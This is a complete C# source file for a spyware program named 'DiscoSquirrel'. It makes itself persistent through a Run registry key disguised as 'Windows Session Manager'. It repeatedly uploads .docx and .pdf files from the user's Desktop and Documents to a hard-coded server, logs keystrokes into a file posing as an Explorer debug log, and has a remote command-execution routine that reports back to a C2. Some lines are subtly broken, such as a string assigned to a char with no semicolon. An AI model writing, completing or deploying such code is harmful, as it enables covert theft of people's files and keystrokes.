using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web.Script.Serialization;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace DiscoSquirrel
{
    class Program
    {
        private static int crypto_key = 0x7331;
        private static char server = "10.34.1.22"

        [DllImport("user32.dll", SetLastError = false)]
        public static extern short GetAsyncKeyState(int vKey);

        static string DecryptString(string buffer)
        {
            var base64_encoded = Convert.FromBase64String(buffer);
            string buffer_to_process = Encoding.UTF8.GetString(base64_encoded);
            string decrypted_buffer = String.Empty;

            foreach (char c in buffer_to_process)
            {
                decrypted_buffer += (char)(c - crypto_key);
            }

            return decrypted_buffer;
        }

        static void MakePersistent()
        {
            string new_app_path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\smss.exe";
            File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, new_app_path, true);
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("Windows Session Manager", "\"" + new_app_path + "\"");
        }

        static List<String> GetPaths()
        {
            List<String> folders = new List<string>();
            folders.Add(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
            folders.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));

            return folders;
        }

        static void UploadFile(string file_path)
        {
            try
                {
                    var httpWebRequest = (HttpWebRequest)WebRequest.Create(server.ToString());
                    httpWebRequest.ContentType = "application/json";
                    httpWebRequest.Method = "POST";

                    Dictionary<string, string> file_info = new Dictionary<string, string>();
                    byte[] file_bytes = File.ReadAllBytes(file_path);
       
                    file_info["file_name"] = file_path.Split('/').Last();
                    file_info["file_content"] = Convert.ToBase64String(file_bytes);

                    string file_json = new JavaScriptSerializer().Serialize(file_info);

                    using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
                    {
                        streamWriter.Write(file_json);
                        streamWriter.Flush();
                        streamWriter.Close();
                    }

                    var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                    using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                    {
                        var result = streamReader.ReadToEnd();
                    }
                }
                catch
                {
                    ;
                }   
        }

        static void FindFiles()
        {   
            while(true)
            {
                foreach (var path in GetPaths())
                {
                    foreach (var file in Directory.GetFiles(path, "*.docx", SearchOption.AllDirectories))
                    {
                        UploadFile(file);
                    }

                    foreach (var file in Directory.GetFiles(path, "*.pdf", SearchOption.AllDirectories))
                    {
                        UploadFile(file);
                    }
                }
                Thread.Sleep(300000);
            }
        }

        static void SendCommandStatusToC2(Dictionary<string, string> command_output)
        {
            var httpWebRequest = (HttpWebRequest)WebRequest.Create(server.ToString());
            httpWebRequest.ContentType = "application/json";
            httpWebRequest.Method = "POST";

            string cmd_json = new JavaScriptSerializer().Serialize(command_output);

            using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
            {
                streamWriter.Write(cmd_json);
                streamWriter.Flush();
                streamWriter.Close();
            }

            var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
            {
                var result = streamReader.ReadToEnd();
            }
        }

        static void ExecuteCommand(String command)
        {
            var args = command.Split(null);
            Dictionary<string, string> command_output = new Dictionary<string, string>();

            Process process = new Process();
            process.StartInfo.FileName = args[0];
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.CreateNoWindow = true;

            int args_len = command.Split(null).Length;

            if (args_len > 1) process.StartInfo.Arguments = args[1];

            for (int i = 2; i < args_len; ++i)
            {
                process.StartInfo.Arguments = String.Concat(process.StartInfo.Arguments, " ", args[i]);
            }

            process.Start();

            StreamReader output = process.StandardOutput;
            while (!process.HasExited)
            {
                Thread.Sleep(100);

                if (!output.EndOfStream)
                {
                    command_output["stdout"] += output.ReadLine();
                }
            }

            command_output["cmd"] = command;
            command_output["stdout"] += output.ReadLine();
            command_output["exit_code"] = process.ExitCode.ToString();

            SendCommandStatusToC2(command_output);
        }

        static void LogKeys()
        {
            KeysConverter conv = new KeysConverter();
            String text = "";
            String path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Windows\\Explorer\\ExplorerDebugLog.etl";

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                }
            }

            while (true)
            {
                Thread.Sleep(10);

                for (int i = 0; i < 255; i++)
                {
                    int key = GetAsyncKeyState(i);

                    if (key == 1 || key == -32767)
                    {
                        text = conv.ConvertToString(i);
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.WriteLine(text);
                        }
                        break;
                    }
                }
            }
        }

        static void Main(string[] args)
        {
            MakePersistent();

            new Thread(() =>
            {
                Thread.CurrentThread.IsBackground = true;
                FindFiles();
            }).Start();

            new Thread(() =>
            {
                Thread.CurrentThread.IsBackground = true;
                LogKeys();
            }).Start();
        }
    }
}
